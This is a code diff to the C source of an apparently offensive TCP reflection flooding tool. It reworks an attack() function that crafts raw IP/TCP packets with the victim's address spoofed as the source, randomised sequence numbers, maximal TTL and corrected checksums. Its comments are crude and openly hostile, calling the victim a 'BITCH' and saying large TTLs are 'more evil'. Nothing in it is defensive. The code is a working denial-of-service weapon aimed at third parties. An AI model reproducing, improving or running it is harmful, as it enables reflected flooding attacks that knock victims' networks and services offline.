@@ -284,8 +284,18 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
     sin.sin_port = reflectorPort;
     sin.sin_family = AF_INET; // set socket family
 
-    // Calculate TCP offset.
-    xf_tcphdr->th_off = (sizeof(struct tcp)) / 4;
+    // The BITCH IP & PORT we're packeting.
+    xf_iphdr->ip_src.s_addr = dest;
+    xf_tcphdr->th_sport = htons(dstport);
+
+    // Header shit
+    xf_iphdr->ip_v = 4;
+    xf_iphdr->ip_hl = 5;
+    xf_iphdr->ip_tos = 0;
+    xf_tcphdr->th_urp = 0;
+    xf_iphdr->ip_id = htons(rand_cmwc());
+    xf_iphdr->ip_off = htons(0x4000);
+    xf_iphdr->ip_p = IPPROTO_TCP;
 
     // Set TCP options accordingly based on what kind of reflection attack we're doing.
     switch (mode)
@@ -314,15 +324,6 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
         }
     }
 
-    // Header shit
-    xf_iphdr->ip_v = 4;
-    xf_iphdr->ip_hl = 5;
-    xf_iphdr->ip_tos = 0;
-    xf_tcphdr->th_urp = 0;
-    xf_iphdr->ip_id = htons(rand_cmwc());
-    xf_iphdr->ip_off = htons(0x4000);
-    xf_iphdr->ip_p = IPPROTO_TCP;
-
     // Set randomized SEQ and ACK
     xf_tcphdr->th_ack = htonl(rand_cmwc());
     xf_tcphdr->th_seq = htonl(rand_cmwc());
@@ -332,21 +333,22 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
         xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
 
     // Randomize TCP window.
-    xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
+    //xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
+    // No, set it to 8192 instead.
+    xf_tcphdr->th_win = htons(8192);
 
     // larger ttls are also more evil 
     xf_iphdr->ip_ttl = TCP_TTL_MAX;
 
-    // The BITCH IP & PORT we're packeting.
-    xf_iphdr->ip_src.s_addr = dest;
-    xf_tcphdr->th_sport = htons(dstport);
+    // Calculate TCP offset.
+    xf_tcphdr->th_off = (sizeof(struct tcp)) / 4;
 
     // Calculate IP length
     xf_iphdr->ip_len = (sizeof(struct ip) + sizeof(struct tcp));
     xf_iphdr->ip_off = htons(0x4000);
 
     // Calculate TCP checksum
-    xf_tcphdr->th_sum = 0;
+    xf_tcphdr->th_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
     xf_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
 
     printf("-> TCP Packet Size: %zu\n", (sizeof(struct ip) + sizeof(struct tcp)));
@@ -418,16 +420,6 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
         // Randomize TCP source port.
         if (dstport == 0)
             xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
-
-        // Randomize TCP window.
-        xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
-
-        // Calculate IP length & offset
-        xf_iphdr->ip_len = (sizeof(struct ip) + sizeof(struct tcp));
-        xf_iphdr->ip_off = htons(0x4000);
-
-        // Calculate TCP offset
-        xf_tcphdr->th_off = (sizeof(struct tcp) / 4);
 
         // Calculate TCP checksum
         xf_tcphdr->th_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
